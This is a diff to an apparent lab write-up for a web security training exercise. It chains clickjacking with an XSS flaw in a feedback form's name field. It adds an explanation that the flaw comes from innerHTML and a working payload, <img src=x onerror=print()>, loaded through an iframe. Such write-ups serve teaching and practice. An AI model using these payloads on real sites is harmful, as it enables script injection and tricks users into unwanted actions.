@@ -125,6 +125,12 @@ The URL loaded inside the iframe contains a maliciously crafted parameter that e
 
 xss vulnerability is present in the feedback form, in the ```name``` field.parameter value of the name field is ```name``` itself.
 
+xss due to using ```innerHTML```.
+
+```xss payload - <img src=x onerror=print()>```
+
+load the name parameter with the xss payload and other parameters also and make user to submit the form using clickjacking.
+
 ***Payload***
 ```
 <style>
@@ -143,5 +149,6 @@ xss vulnerability is present in the feedback form, in the ```name``` field.param
     }
 </style>
 <div>Click me</div>
-<iframe src="https://0a44005604fb15528036670c008a00a3.web-security-academy.net/feedback?name=<img src=x onerror=print(1)> &email=od@gmail.com&subject=hello&message=zxcvb" ></iframe>
+<iframe src="https://0a44005604fb15528036670c008a00a3.web-security-academy.net/feedback?name=<img src=x onerror=print()> &email=od@gmail.com&subject=hello&message=zxcvb" ></iframe>
 ```
+
